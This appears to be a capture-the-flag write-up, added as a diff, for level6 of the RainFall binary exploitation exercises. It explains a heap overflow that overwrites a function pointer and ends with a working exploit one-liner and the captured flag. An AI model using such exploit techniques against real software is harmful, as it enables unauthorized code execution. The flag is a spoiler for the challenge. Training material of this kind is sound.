@@ -1,0 +1,33 @@
+
+ ▄▄▄▄                                    ▄▄▄▄                  ▄▄▄▄
+ ▀▀██                                    ▀▀██                 ██▀▀▀█
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                ██ ▄▄▄
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                ███▀▀██▄
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                ██    ██
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▀██▄▄██▀
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀               ▀▀▀▀
+
+What this program does:
+- malloc 0x40 (64) bytes as buffer
+- malloc 4 bytes and puts a pointer to m() inside
+- copy argv[1] into the 64 bytes buffer without checking its length <- the vulnerability
+- dereferences the function pointer (call m())
+There exist another function, n(), that gives us the flag (located at 0x08048454).
+
+The heap memory, looks like this:
+[64 bytes]--------[4 bytes]------(...)
+                      ^ the function pointer buffer
+   ^ the user input buffer
+
+We can overflow the user input into the memory area of the function pointer:
+
+
+level6@RainFall:~$ gdb ./level6
+-> Get a buffer overflow pattern: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+(gdb) set args (...)
+> Program received signal SIGSEGV, Segmentation fault.
+> 0x41346341 in ?? ()
+-> Calculate the offset: 72
+# Then craft user input that overflows the buffer and overwrite the function pointer:
+./level6 $(printf "a%0.s" $(seq 1 72))$(echo -ne "\x54\x84\x04\x08")
+> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
